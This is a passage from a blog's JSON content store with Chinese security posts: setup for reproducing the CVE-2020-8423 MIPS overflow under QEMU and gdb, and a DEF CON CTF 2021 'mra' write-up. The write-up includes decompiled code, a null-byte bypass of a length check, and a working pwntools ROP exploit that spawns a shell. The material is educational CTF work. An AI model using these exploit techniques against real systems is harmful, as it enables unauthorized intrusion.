-j 16</span><br></pre></td></tr></table></figure>\n<h2 id=\"gdb-multiarch下載\"><a href=\"#gdb-multiarch下載\" class=\"headerlink\" title=\"gdb-multiarch下載\"></a>gdb-multiarch下載</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -y gdb-multiarch</span><br></pre></td></tr></table></figure>\n<h2 id=\"編譯測試用程式\"><a href=\"#編譯測試用程式\" class=\"headerlink\" title=\"編譯測試用程式\"></a>編譯測試用程式</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#與路徑有關的指令須調整</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$PATH</span>::/home/xiaobye/Documents/buildroot/output/host/usr/bin</span><br><span class=\"line\">mips-linux-gcc -static -o vuln vuln.c</span><br></pre></td></tr></table></figure>\n<h1 id=\"QEMU\"><a href=\"#QEMU\" class=\"headerlink\" title=\"QEMU\"></a>QEMU</h1><h2 id=\"firmware-emulation\"><a href=\"#firmware-emulation\" class=\"headerlink\" title=\"firmware emulation\"></a>firmware emulation</h2><p><a href=\"https://people.debian.org/~aurel32/qemu/mips/\">kernel&amp;disk載點</a><br>啟動虛擬機</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tunctl -t tap0</span><br><span class=\"line\">sudo ifconfig tap0 192.168.50.2/24 up</span><br><span class=\"line\"></span><br><span class=\"line\">sudo qemu-system-mips -M malta \\</span><br><span class=\"line\">    -m 512M \\</span><br><span class=\"line\">    -kernel vmlinux-3.2.0-4-4kc-malta \\</span><br><span class=\"line\">    -hda debian_wheezy_mips_standard.qcow2 \\</span><br><span class=\"line\">    -append <span class=\"string\">&quot;root=/dev/sda1 console=tty0&quot;</span> \\</span><br><span class=\"line\">    -netdev tap,id=tapnet,ifname=tap0,script=no \\</span><br><span class=\"line\">    -device rtl8139,netdev=tapnet \\</span><br><span class=\"line\">    -nographic</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/6.png\"></p>\n<p>虛擬機內，將<code>/etc/network/interfaces</code>的內容，替換成下方配置。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file describes the network interfaces available on your system</span></span><br><span class=\"line\"><span class=\"comment\"># and how to activate them. For more information, see interfaces(5).</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The loopback network interface</span></span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The primary network interface</span></span><br><span class=\"line\">allow-hotplug eth0</span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">    address 192.168.50.1</span><br><span class=\"line\">    netmask 255.255.255.0</span><br><span class=\"line\">    gateway 192.168.50.2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>設置虛擬機網卡IP</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifconfig eth0 192.168.50.1/24 up</span><br></pre></td></tr></table></figure>\n<h2 id=\"上傳檔案\"><a href=\"#上傳檔案\" class=\"headerlink\" title=\"上傳檔案\"></a>上傳檔案</h2><p>以下指令在host端執行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#使用scp將韌體root filesystem</span></span><br><span class=\"line\">scp -r squashfs-root root@192.168.50.1:~</span><br><span class=\"line\"><span class=\"comment\">#上傳編譯好的測試程式</span></span><br><span class=\"line\">scp ./vuln  root@192.168.50.1:~</span><br><span class=\"line\"><span class=\"comment\">#上傳gdbserver</span></span><br><span class=\"line\">scp ./gdbserver  root@192.168.50.1:~</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"GDB\"><a href=\"#GDB\" class=\"headerlink\" title=\"GDB\"></a>GDB</h1><h2 id=\"Guest\"><a href=\"#Guest\" class=\"headerlink\" title=\"Guest\"></a>Guest</h2><p>在虛擬機中執行以下指令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./gdbserver 0.0.0.0:9000 ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/7.png\"></p>\n<h2 id=\"Host\"><a href=\"#Host\" class=\"headerlink\" title=\"Host\"></a>Host</h2><p>在Host上執行以下指令啟動gdb-multiarch</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#要將檔案中的符號以及架構讀入</span></span><br><span class=\"line\">gdb-multiarch  ./vuln</span><br></pre></td></tr></table></figure>\n<p>gdb中下指令連接到gdbserver，執行以下指令後可以發現確實造成Buffer overflow，覆蓋到PC。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">target remote 192.168.50.1:9000</span><br><span class=\"line\">c</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/09/05/%E5%88%9D%E6%8E%A2IOT%E5%AE%89%E5%85%A8CVE-2020-8423-PART1/8.png\"></p>\n<h1 id=\"Resource\"><a href=\"#Resource\" class=\"headerlink\" title=\"Resource\"></a>Resource</h1><p><a href=\"https://blog.csdn.net/zhy025907/article/details/52332528\">学习记录：交叉编译环境配置（buildroot and gdb&amp;gdbserver）</a><br><a href=\"https://github.com/akpotter/embedded-toolkit/tree/master/src/gdb\">akpotter/embedded-toolkit</a><br><a href=\"https://www.mrskye.cn/archives/e77640bd/\">CVE-2020-8423 栈溢出复现</a></p>\n"},{"title":"起點","date":"2021-09-05T09:14:53.000Z","_content":"![](1.png)\n","source":"_posts/起點.md","raw":"---\ntitle: 起點\ndate: 2021-09-05 17:14:53\ntags:\n---\n![](1.png)\n","slug":"起點","published":1,"updated":"2021-09-07T16:35:19.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyopyh2600039kgk67ihap6e","content":"<p><img src=\"/2021/09/05/%E8%B5%B7%E9%BB%9E/1.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/2021/09/05/%E8%B5%B7%E9%BB%9E/1.png\"></p>\n"},{"title":"defcon ctf 2021 quals - mra","date":"2022-01-21T18:28:16.000Z","_content":"\n# mra\n![](49iqumD.png)\n\n![img](FuvJDpX.png)\n\n![img](3gGqHMC.png)\n\n## 環境設置\n\n由於本題為 aarch64 架構，要測試程式的話必須安裝 **qemu-aarch64**。\n\n安裝完以後執行 `qemu-aarch64  -g 2000 mra ` 便可以使用 **gdb-multiarch** 執行 `target remote localhost:2000` 進行 remote debugging。\n\n若要邊撰寫腳本邊 debug 的話，pwntools 對於跨平台的 debug 有相當好得支援，設定好 `context` 之後，就可以直接用，`gdb.debug` 開始測試。其背後是使用 **qemu-user** 提供的 debug mode。\n\n```python\nfrom pwn import *\ncontext.clear()\ncontext.update(arch=\"aarch64\")\n\np = gdb.debug(\"./mra\")\np.interactive()\n```\n\n## 逆向\n\n經過一些簡單的動靜態分析，還有 **qemu-user** 提供的 strace 功能，大致可得到下列這份 code\n\n```c\n__int64 vuln(__int64 a1, __int64 a2)\n{\n    char v3;\n    unsigned int v4;\n    char v7;\n    unsigned int i;\n    int count;\n\n    count = 0;\n    for ( i = 0; ; ++i )\n    {\n        v7 = *(_BYTE *)(a2 + count);\n        if ( !v7 )\n            break;\n        if ( v7 == '%' )\n        {\n            v3 = 16 * hex_to_dec(*(_BYTE *)(a2 + count + 1));\n            v7 = v3 | hex_to_dec(*(_BYTE *)(a2 + count + 2));\n            count += 3;\n        }\n        else\n        {\n            ++count;\n        }\n        v4 = i;\n        *(_BYTE *)(a1 + v4) = v7;\n    }\n    return i;\n}\n\n__int64 main()\n{\n    __int64 *v1;\n    unsigned __int8 v2[1024];\n    char v3[16];\n    int v4;\n    unsigned __int64 lenStrNum;\n    __int64 v6;\n    unsigned __int8 *v7;\n    unsigned __int8 *strNum;\n    unsigned __int8 *v9;\n    unsigned __int8 *v10;\n    unsigned int v11;\n    const char *v12;\n    unsigned __int8 *v13;\n    unsigned __int8 *token_;\n\n    sub_401018((__int64)&unk_41D0F0, 0, 2, 0);\n    sub_401018((__int64)&unk_41D000, 0, 2, 0);\n    v13 = \"GET /api/isodd/\";\n    v12 = \"Buy isOddCoin, the hottest new cryptocurrency!\";\n    memset(v3, 0, sizeof(v3));\n    memset((int8x16_t *)v2, 0, sizeof(v2));\n    token_ = \"public\";\n    v11 = read(0, v2, 0x3FF); // 沒有 null terminate 的問題\n    if ( v11 <= 8 || strncmp(v2, v13, 15) )\n        return 0;\n    v10 = strchr(v2, '\\n');\n    if ( v10 )\n    {\n        *v10-- = 0;\n        if ( *v10 == '\\r' )\n            *v10 = 0;\n    }\n    v10 = strtok(v2, \" HTTP/\");\n    if ( v10 )\n        *v10 = 0;\n    v9 = strchr(v2, '?');\n    if ( v9 )\n    {\n        *v9++ = 0;\n        if ( !strncmp(v9, \"token=\", 6) )\n            token_ = v9 + 6;\n    }\n    strNum = &v2[15];\n    v7 = strchr(&v2[15], '/');\n    if ( v7 )\n        *v7 = 0;\n    v6 = 0;\n    lenStrNum = strlen(strNum);\n    if ( !strcmp(token_, \"enterprise\") )\n    {\n        if ( lenStrNum > 0xC )\n        {\n            response(401, \"{\\n\\t\\\"error\\\": \\\"contact us for unlimited large number support\\\"\\n}\");\n            return 0;\n        }\n    }\n    else if ( !strcmp(token_, \"premium\") )\n    {\n        if ( lenStrNum > 9 )\n        {\n            response(401, \"{\\n\\t\\\"error\\\": \\\"sign up for enterprise to get large number support\\\"\\n}\");\n            return 0;\n        }\n    }\n    else\n    {\n        token_ = \"public\";\n        if ( lenStrNum > 6 )\n        {\n            response(401, \"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get large number support\\\"\\n}\");\n            return 0;\n        }\n    }\n    lenStrNum = (int)vuln((__int64)v3, (__int64)strNum);// 漏洞函數，v3 也在 stack 上\n    if ( v3[0] == '-' && !strcmp(token_, \"public\") )\n    {\n        response(401, \"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get negative number support\\\"\\n}\");\n        return 0;\n    }\n    else\n    {\n        v4 = (unsigned __int8)v3[lenStrNum - 1] - '0';\n        v1 = 0;\n        if ( !strcmp(token_, \"public\") )\n            asprintf(&v1, \"{\\n\\t\\\"isodd\\\": %s,\\n\\t\\\"ad\\\": \\\"%s\\\"\\n}\\n\");\n        else\n            asprintf(&v1, \"{\\n\\t\\\"isodd\\\": %s\\n}\\n\");\n        response(200, v1);\n        return 0;\n    }\n}\n```\n\n仔細分析完上面的程式碼可以知道這整份 code 大部分的工作都在進行 http request 的 parsing，而這份程式接受的 http request 格式大約如下，其中 `[strNum]` 以及 `[token]` 替換成上面 c code 中對應的變數。\n\n```\nGET /api/isodd/[strNum]/?token=[token] HTTP/\n```\n\n## 漏洞函數\n\n漏洞函數在上面 c code 中的 `vuln` 中，但是在進入 `vuln` 之前，中間會驗證 `lenStrNum` ，而長度最大只能為 0xc。如此一來便很難造成 overflow。( v3 在 stack 上 )\n\n```c\nlenStrNum = strlen(strNum);\n...\nlenStrNum = (int)vuln((__int64)v3, (__int64)strNum);\n```\n\n接下來看到 `vuln` 內部，可以看到這個函數主要負責進行類似 `strcpy` 的行為，一樣也是以 `\\x00` 為中止點，且多了一個功能。當目前正在 copy 的字元為 `%` 時，會將後面的兩個字元視為 hex string 轉成一個 byte 並存起來。例如 `\"%0a\"`會被轉成 `'\\n'` ，並當成一個 byte 存取來。我們也可以利用這樣的特性來製作使得 `x00` 被跳過。**例如 `\"%\\x001aaaaaaaaaa\"` 這個字串的雖然有  null terminator，但在這裡由於前面有 `%` 的緣故，會直接跳過，而且對於 `strlen` 來說這個字串長度只有 1 ，但實際上有 13 bytes，一來便可以順便繞過對於 `strNum` 的長度限制。**\n\n```c\n...\nif ( v7 == '%' )\n{\n    v3 = 16 * hex_to_dec(*(_BYTE *)(a2 + count + 1));\n    v7 = v3 | hex_to_dec(*(_BYTE *)(a2 + count + 2));\n    count += 3;\n}\n...\n```\n\n利用上面提到的方法，我們便可以進行 buffer overflow，但這裡有個有趣的現象，可以看出來這份程式有被特殊處理過。\n\n以下分別為 main 的 prologue 跟 epilogue，其中可以看到在進行創造 stack frame 的時候，居然不是以高地址為 stack bottom ，然後往低地址增長，而是以低地址為 stack bottom ，然後往高地址增長。\n\n其中很明顯地看到人為的處理。例如說:\n\n```\nsub sp, sp, #0x490\n被換成\nadd sp, sp, #0x490\nsub sp, sp, #0x490\n\n然後\nstp x29, x30, [sp,#0]\n被換成\nstp x29, x30, [sp,#0]\nadd sp, sp, #0x490\n```\n\n\n\n![](Z8LVbx5.png)\n\n![](3QdQD5F.png)\n\n那麼這樣我們的 buffer overflow 的構造 ROP 的方式就會跟以往不太一樣。以下為 layout。\n\n![](T0myzaL.png)\n\n我們的目標就是覆蓋到 vuln's stack frame 上的 `x30` 藉此控制到 return 後的流程。\n\n![img](1v2Ebom.png)\n\n## 尋找 gadget\n\n利用 IDA 的 **find text** 搭配 regular express 搜尋 `svc *0` 便可以搜尋到很多執行 system call 的 gadget，\n\n而這裡我挑的是這段:\n\n![](iSM4UfH.png)\n\n\n\n## exploit\n\n將上面得到的資訊整理再一起，我們可以得到以下 exploit:\n\n```python\nfrom pwn import *\ncontext.clear()\ncontext.update(arch=\"aarch64\")\n\nlocal = False\n\ndef encode(s):\n    return s.replace(b'\\x00', b'%\\x00\\x00')\np = None\nif local:\n    p = gdb.debug(\"./mra\", gdbscript = '''\n        b *0x400338\n        b *0x4005d4\n        b *0x4002C0\n    '''\n    )\nelse:\n    p = remote(\"172.17.0.2\", 8000)\nrop_chain = flat([\n    # execve(0x41d000, 0, 0)\n    0, # x4\n    0, # x3\n    0, # x2\n    0, # x1\n    0x41D000,   # x0\n    221, # x8\n\n    # read(0, 0x41d000,64)\n    0,   # x4\n    0,   # x3\n    0x10, # x2\n    0x41D000, # x1\n    0,   # x0\n    63, # x8\n\n])\n'''\n.text:00000000004007EC                 LDUR            X8, [SP,#-0x30+arg_28]\n.text:00000000004007F0                 LDUR            X0, [SP,#-0x30+arg_20]\n.text:00000000004007F4                 LDUR            X1, [SP,#-0x30+arg_18]\n.text:00000000004007F8                 LDUR            X2, [SP,#-0x30+arg_10]\n.text:00000000004007FC                 LDUR            X3, [SP,#-0x30+arg_8]\n.text:0000000000400800                 LDUR            X4, [SP,#-0x30+arg_0]\n.text:0000000000400804                 SVC             0\n.text:0000000000400808                 SUB             SP, SP, #0x30 ; '0'\n.text:000000000040080C                 RET\n'''\ntrigger = flat([\n    0, # x29\n    #\n    0x4007EC\n])\n\np.send((b\"GET /api/isodd/%\\x001\" + encode(b\"a\" * (0x68 - len(rop_chain)  - 1) + rop_chain + trigger)).ljust(0x3ff, b'\\x00'))\n\np.send(b\"/bin/sh\\x00\")\n\n\np.interactive()\n```\n\n\n\n# Resource\n\n[Arm syscall number table](https://github.com/torvalds/linux/blob/v4.17/include/uapi/asm-generic/unistd.h)\n\n[A Guide to ARM64 / AArch64 Assembly on Linux with Shecodes and Cryptography](https://modexp.wordpress.com/2018/10/30/arm64-assembly/)\n","source":"_posts/defcon-ctf-2021-quals-mra.md","raw":"---\ntitle: defcon ctf 2021 quals - mra\ndate: 2022-01-22 02:28:16\ntags:\n- defcon ctf 2021 quals\n- pwn\n- aarch64\ncategories:\n- CTF\n---\n\n# mra\n![](49iqumD.png)\n\n![img](FuvJDpX.png)\n\n![img](3gGqHMC.png)\n\n## 環境設置\n\n由於本題為 aarch64 架構，要測試程式的話必須安裝 **qemu-aarch64**。\n\n安裝完以後執行 `qemu-aarch64  -g 2000 mra ` 便可以使用 **gdb-multiarch** 執行 `target remote localhost:2000` 進行 remote debugging。\n\n若要邊撰寫腳本邊 debug 的話，pwntools 對於跨平台的 debug 有相當好得支援，設定好 `context` 之後，就可以直接用，`gdb.debug` 開始測試。其背後是使用 **qemu-user** 提供的 debug mode。\n\n```python\nfrom pwn import *\ncontext.clear()\ncontext.update(arch=\"aarch64\")\n\np = gdb.debug(\"./mra\")\np.interactive()\n```\n\n## 逆向\n\n經過一些簡單的動靜態分析，還有 **qemu-user** 提供的 strace 功能，大致可得到下列這份 code\n\n```c\n__int64 vuln(__int64 a1, __int64 a2)\n{\n    char v3;\n    unsigned int v4;\n    char v7;\n    unsigned int i;\n    int count;\n\n    count = 0;\n    for ( i = 0; ; ++i )\n    {\n        v7 = *(_BYTE *)(a2 + count);\n        if ( !v7 )\n            break;\n        if ( v7 == '%' )\n        {\n            v3 = 16 * hex_to_dec(*(_BYTE *)(a2 + count + 1));\n            v7 = v3 | hex_to_dec(*(_BYTE *)(a2 + count + 2));\n            count += 3;\n        }\n        else\n        {\n            ++count;\n        }\n        v4 = i;\n        *(_BYTE *)(a1 + v4) = v7;\n    }\n    return i;\n}\n\n__int64 main()\n{\n    __int64 *v1;\n    unsigned __int8 v2[1024];\n    char v3[16];\n    int v4;\n    unsigned __int64 lenStrNum;\n    __int64 v6;\n    unsigned __int8 *v7;\n    unsigned __int8 *strNum;\n    unsigned __int8 *v9;\n    unsigned __int8 *v10;\n    unsigned int v11;\n    const char *v12;\n    unsigned __int8 *v13;\n    unsigned __int8 *token_;\n\n    sub_401018((__int64)&unk_41D0F0, 0, 2, 0);\n    sub_401018((__int64)&unk_41D000, 0, 2, 0);\n    v13 = \"GET /api/isodd/\";\n    v12 = \"Buy isOddCoin, the hottest new cryptocurrency!\";\n    memset(v3, 0, sizeof(v3));\n    memset((int8x16_t *)v2, 0, sizeof(v2));\n    token_ = \"public\";\n    v11 = read(0, v2, 0x3FF); // 沒有 null terminate 的問題\n    if ( v11 <= 8 || strncmp(v2, v13, 15) )\n        return 0;\n    v10 = strchr(v2, '\\n');\n    if ( v10 )\n    {\n        *v10-- = 0;\n        if ( *v10 == '\\r' )\n            *v10 = 0;\n    }\n    v10 = strtok(v2, \" HTTP/\");\n    if ( v10 )\n        *v10 = 0;\n    v9 = strchr(v2, '?');\n    if ( v9 )\n    {\n        *v9++ = 0;\n        if ( !strncmp(v9, \"token=\", 6) )\n            token_ = v9 + 6;\n    }\n    strNum = &v2[15];\n    v7 = strchr(&v2[15], '/');\n    if ( v7 )\n        *v7 = 0;\n    v6 = 0;\n    lenStrNum = strlen(strNum);\n    if ( !strcmp(token_, \"enterprise\") )\n    {\n        if ( lenStrNum > 0xC )\n        {\n            response(401, \"{\\n\\t\\\"error\\\": \\\"contact us for unlimited large number support\\\"\\n}\");\n            return 0;\n        }\n    }\n    else if ( !strcmp(token_, \"premium\") )\n    {\n        if ( lenStrNum > 9 )\n        {\n            response(401, \"{\\n\\t\\\"error\\\": \\\"sign up for enterprise to get large number support\\\"\\n}\");\n            return 0;\n        }\n    }\n    else\n    {\n        token_ = \"public\";\n        if ( lenStrNum > 6 )\n        {\n            response(401, \"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get large number support\\\"\\n}\");\n            return 0;\n        }\n    }\n    lenStrNum = (int)vuln((__int64)v3, (__int64)strNum);// 漏洞函數，v3 也在 stack 上\n    if ( v3[0] == '-' && !strcmp(token_, \"public\") )\n    {\n        response(401, \"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get negative number support\\\"\\n}\");\n        return 0;\n    }\n    else\n    {\n        v4 = (unsigned __int8)v3[lenStrNum - 1] - '0';\n        v1 = 0;\n        if ( !strcmp(token_, \"public\") )\n            asprintf(&v1, \"{\\n\\t\\\"isodd\\\": %s,\\n\\t\\\"ad\\\": \\\"%s\\\"\\n}\\n\");\n        else\n            asprintf(&v1, \"{\\n\\t\\\"isodd\\\": %s\\n}\\n\");\n        response(200, v1);\n        return 0;\n    }\n}\n```\n\n仔細分析完上面的程式碼可以知道這整份 code 大部分的工作都在進行 http request 的 parsing，而這份程式接受的 http request 格式大約如下，其中 `[strNum]` 以及 `[token]` 替換成上面 c code 中對應的變數。\n\n```\nGET /api/isodd/[strNum]/?token=[token] HTTP/\n```\n\n## 漏洞函數\n\n漏洞函數在上面 c code 中的 `vuln` 中，但是在進入 `vuln` 之前，中間會驗證 `lenStrNum` ，而長度最大只能為 0xc。如此一來便很難造成 overflow。( v3 在 stack 上 )\n\n```c\nlenStrNum = strlen(strNum);\n...\nlenStrNum = (int)vuln((__int64)v3, (__int64)strNum);\n```\n\n接下來看到 `vuln` 內部，可以看到這個函數主要負責進行類似 `strcpy` 的行為，一樣也是以 `\\x00` 為中止點，且多了一個功能。當目前正在 copy 的字元為 `%` 時，會將後面的兩個字元視為 hex string 轉成一個 byte 並存起來。例如 `\"%0a\"`會被轉成 `'\\n'` ，並當成一個 byte 存取來。我們也可以利用這樣的特性來製作使得 `x00` 被跳過。**例如 `\"%\\x001aaaaaaaaaa\"` 這個字串的雖然有  null terminator，但在這裡由於前面有 `%` 的緣故，會直接跳過，而且對於 `strlen` 來說這個字串長度只有 1 ，但實際上有 13 bytes，一來便可以順便繞過對於 `strNum` 的長度限制。**\n\n```c\n...\nif ( v7 == '%' )\n{\n    v3 = 16 * hex_to_dec(*(_BYTE *)(a2 + count + 1));\n    v7 = v3 | hex_to_dec(*(_BYTE *)(a2 + count + 2));\n    count += 3;\n}\n...\n```\n\n利用上面提到的方法，我們便可以進行 buffer overflow，但這裡有個有趣的現象，可以看出來這份程式有被特殊處理過。\n\n以下分別為 main 的 prologue 跟 epilogue，其中可以看到在進行創造 stack frame 的時候，居然不是以高地址為 stack bottom ，然後往低地址增長，而是以低地址為 stack bottom ，然後往高地址增長。\n\n其中很明顯地看到人為的處理。例如說:\n\n```\nsub sp, sp, #0x490\n被換成\nadd sp, sp, #0x490\nsub sp, sp, #0x490\n\n然後\nstp x29, x30, [sp,#0]\n被換成\nstp x29, x30, [sp,#0]\nadd sp, sp, #0x490\n```\n\n\n\n![](Z8LVbx5.png)\n\n![](3QdQD5F.png)\n\n那麼這樣我們的 buffer overflow 的構造 ROP 的方式就會跟以往不太一樣。以下為 layout。\n\n![](T0myzaL.png)\n\n我們的目標就是覆蓋到 vuln's stack frame 上的 `x30` 藉此控制到 return 後的流程。\n\n![img](1v2Ebom.png)\n\n## 尋找 gadget\n\n利用 IDA 的 **find text** 搭配 regular express 搜尋 `svc *0` 便可以搜尋到很多執行 system call 的 gadget，\n\n而這裡我挑的是這段:\n\n![](iSM4UfH.png)\n\n\n\n## exploit\n\n將上面得到的資訊整理再一起，我們可以得到以下 exploit:\n\n```python\nfrom pwn import *\ncontext.clear()\ncontext.update(arch=\"aarch64\")\n\nlocal = False\n\ndef encode(s):\n    return s.replace(b'\\x00', b'%\\x00\\x00')\np = None\nif local:\n    p = gdb.debug(\"./mra\", gdbscript = '''\n        b *0x400338\n        b *0x4005d4\n        b *0x4002C0\n    '''\n    )\nelse:\n    p = remote(\"172.17.0.2\", 8000)\nrop_chain = flat([\n    # execve(0x41d000, 0, 0)\n    0, # x4\n    0, # x3\n    0, # x2\n    0, # x1\n    0x41D000,   # x0\n    221, # x8\n\n    # read(0, 0x41d000,64)\n    0,   # x4\n    0,   # x3\n    0x10, # x2\n    0x41D000, # x1\n    0,   # x0\n    63, # x8\n\n])\n'''\n.text:00000000004007EC                 LDUR            X8, [SP,#-0x30+arg_28]\n.text:00000000004007F0                 LDUR            X0, [SP,#-0x30+arg_20]\n.text:00000000004007F4                 LDUR            X1, [SP,#-0x30+arg_18]\n.text:00000000004007F8                 LDUR            X2, [SP,#-0x30+arg_10]\n.text:00000000004007FC                 LDUR            X3, [SP,#-0x30+arg_8]\n.text:0000000000400800                 LDUR            X4, [SP,#-0x30+arg_0]\n.text:0000000000400804                 SVC             0\n.text:0000000000400808                 SUB             SP, SP, #0x30 ; '0'\n.text:000000000040080C                 RET\n'''\ntrigger = flat([\n    0, # x29\n    #\n    0x4007EC\n])\n\np.send((b\"GET /api/isodd/%\\x001\" + encode(b\"a\" * (0x68 - len(rop_chain)  - 1) + rop_chain + trigger)).ljust(0x3ff, b'\\x00'))\n\np.send(b\"/bin/sh\\x00\")\n\n\np.interactive()\n```\n\n\n\n# Resource\n\n[Arm syscall number table](https://github.com/torvalds/linux/blob/v4.17/include/uapi/asm-generic/unistd.h)\n\n[A Guide to ARM64 / AArch64 Assembly on Linux with Shecodes and Cryptography](https://modexp.wordpress.com/2018/10/30/arm64-assembly/)\n","slug":"defcon-ctf-2021-quals-mra","published":1,"updated":"2022-01-22T23:08:52.756Z","_id":"ckyotnyi100003ngk9k5vcpkb","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"mra\"><a href=\"#mra\" class=\"headerlink\" title=\"mra\"></a>mra</h1><p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/49iqumD.png\"></p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/FuvJDpX.png\" alt=\"img\"></p>\n<p><img src=\"/2022/01/22/defcon-ctf-2021-quals-mra/3gGqHMC.png\" alt=\"img\"></p>\n<h2 id=\"環境設置\"><a href=\"#環境設置\" class=\"headerlink\" title=\"環境設置\"></a>環境設置</h2><p>由於本題為 aarch64 架構，要測試程式的話必須安裝 <strong>qemu-aarch64</strong>。</p>\n<p>安裝完以後執行 <code>qemu-aarch64  -g 2000 mra </code> 便可以使用 <strong>gdb-multiarch</strong> 執行 <code>target remote localhost:2000</code> 進行 remote debugging。</p>\n<p>若要邊撰寫腳本邊 debug 的話，pwntools 對於跨平台的 debug 有相當好得支援，設定好 <code>context</code> 之後，就可以直接用，<code>gdb.debug</code> 開始測試。其背後是使用 <strong>qemu-user</strong> 提供的 debug mode。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.clear()</span><br><span class=\"line\">context.update(arch=<span class=\"string\">&quot;aarch64&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = gdb.debug(<span class=\"string\">&quot;./mra&quot;</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h2><p>經過一些簡單的動靜態分析，還有 <strong>qemu-user</strong> 提供的 strace 功能，大致可得到下列這份 code</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span 